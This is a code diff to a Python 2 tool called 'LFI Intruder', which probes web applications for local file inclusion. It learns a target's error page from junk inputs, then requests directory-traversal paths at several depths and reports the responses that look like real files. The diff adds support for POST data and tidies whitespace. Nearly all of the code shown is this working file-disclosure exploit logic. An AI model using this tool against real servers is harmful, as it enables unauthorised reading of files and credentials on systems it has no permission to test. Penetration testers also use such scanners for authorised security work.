@@ -7,7 +7,7 @@ def Print(something):
         Print("")
         for each in split[1:]:
             print "    {}".format(each)
-          
+
     else:
         print "[*] {}".format(something)
 
@@ -15,7 +15,7 @@ def generatePaths(Max = None):
     paths = []
     root = os.path.abspath(os.sep)
     for previous, dirs, files in os.walk(root):
-        for dir in dirs: 
+        for dir in dirs:
             if len(paths) == Max:
                 return paths
             paths.append(os.path.join(previous, dir))
@@ -25,7 +25,7 @@ def generateFiles(Max = None):
     paths = []
     root = os.path.abspath(os.sep)
     for previous, dirs, files in os.walk(root):
-        for each in files: 
+        for each in files:
             if len(paths) == Max:
                 return paths
             paths.append(os.path.join(previous, each))
@@ -65,27 +65,30 @@ def parse():
 def Banner():
     banner = """
 ##############################################################
- 
-     _     ______ _____      _                  _           
-    | |    |  ___|_   _|    | |                | |          
-    | |    | |_    | | _ __ | |_ _ __ _   _  __| | ___ _ __ 
+
+     _     ______ _____      _                  _
+    | |    |  ___|_   _|    | |                | |
+    | |    | |_    | | _ __ | |_ _ __ _   _  __| | ___ _ __
     | |    |  _|   | || '_ \| __| '__| | | |/ _` |/ _ \ '__|
-    | |____| |    _| || | | | |_| |  | |_| | (_| |  __/ |   
-    \_____/\_|    \___/_| |_|\__|_|   \__,_|\__,_|\___|_|  
+    | |____| |    _| || | | | |_| |  | |_| | (_| |  __/ |
+    \_____/\_|    \___/_| |_|\__|_|   \__,_|\__,_|\___|_|
 
 
 ############################################### By Diego Bernal
                 """
     print banner
 
-def LFI_error_tester(url, tests, tolerance):
+def LFI_error_tester(url, postData, tests, tolerance):
     # ASSUME THAT URL IS IN THE FORM OF: http://host:port/index.php?value=filepath
-    
+
     error = []
     validity = 0
 
     for i in xrange(len(tests)):
-        content = requests.get(url+tests[i]).content.strip()
+        if postData:
+            content = requests.post(url+tests[i], data=postData).content.strip()
+        else:
+            content = requests.get(url+tests[i]).content.strip()
         error.append(content)
 
     best = []
@@ -102,7 +105,7 @@ def LFI_error_tester(url, tests, tolerance):
     error = [i for i in best if i[1] == min_score][0][0]
     return (error, validity)
 
-def LFI_exploiter(url, error, paths, validity, levels=1):
+def LFI_exploiter(url, postData, error, paths, validity, levels=1):
 
     matches = 0
 
@@ -112,14 +115,18 @@ def LFI_exploiter(url, error, paths, validity, levels=1):
             Print("Trying level {}...".format(str(x+1)))
             for i in paths:
                 url_use = (urli+i).replace("..//", "../")
-                content = requests.get(url_use).content.strip()
+
+                if postData:
+                    content = requests.post(url_use, postData).content.strip()
+                else:
+                    content = requests.get(url_use).content.strip()
 
                 # IMPROVE WAY OF CHECKING WHETHER ERROR OR FILE
 
                 if SequenceMatcher(None, content, error).ratio() < validity and abs(len(error) - len(content)) > 50:
                     Print("==> Match found with {}".format(url_use))
                     matches += 1
-    
+
     except KeyboardInterrupt:
         print "\r[*] Aborting, {} matches found.".format(matches)
         return 1
@@ -127,10 +134,10 @@ def LFI_exploiter(url, error, paths, validity, levels=1):
     Print("Finished, {} matches found.".format(matches))
 
 def urlparse(url, value):
-    
+
     base = url.split("?")[0]
     params = url.split("?")[-1].split("&")
-    
+
     for i in params:
         if i.split("=")[0] == value:
             params.append(params.pop(params.index(i)))
@@ -181,6 +188,7 @@ if __name__ == "__main__":
     params = args.param
     levels = args.levels or 1
     wordlist = args.wordlist
+    postData = args.postData or 0
 
     # figure out a way of showing all the configurations at the beginning
 
@@ -196,13 +204,13 @@ if __name__ == "__main__":
     elif args.generate_dirs or args.generate_dirs or args.generate_custom:
 
         if args.generate_dirs:
-            
+
             Print("Generating directory paths from filesystem...")
             paths = generatePaths(maxPaths)
             #Print("Number of directory paths generated: {}.".format(maxPaths))
 
         elif args.generate_files:
-            
+
             Print("Generating file paths from filesystem...")
             paths = generateFiles(maxPaths)
             #Print("Number of file paths generated: {}.".format(maxPaths))
@@ -225,7 +233,7 @@ if __name__ == "__main__":
         paths = generateFiles(maxPaths)
 
         #Print("Number of file paths generated: {}.".format(maxPaths))
-        
+
     if url:
 
         tolerance = 0.75
@@ -245,16 +253,15 @@ if __name__ == "__main__":
         Print("Getting error message...")
 
         tests = getRubbish()
-        error, validity = LFI_error_tester(url, tests, tolerance)
+        error, validity = LFI_error_tester(url, postData, tests, tolerance)
 
         Print("Error message detected, lenght = {}.".format(len(error)))
         Print("Starting exploitation ({} level(s))...".format(levels))
 
 
-        LFI_exploiter(url, error, paths, validity, levels)
+        LFI_exploiter(url, postData, error, paths, validity, levels)
 
-    if out: 
+    if out:
 
         Print("Saving generated paths to {}...".format(out))
         savePaths(out, paths)
-
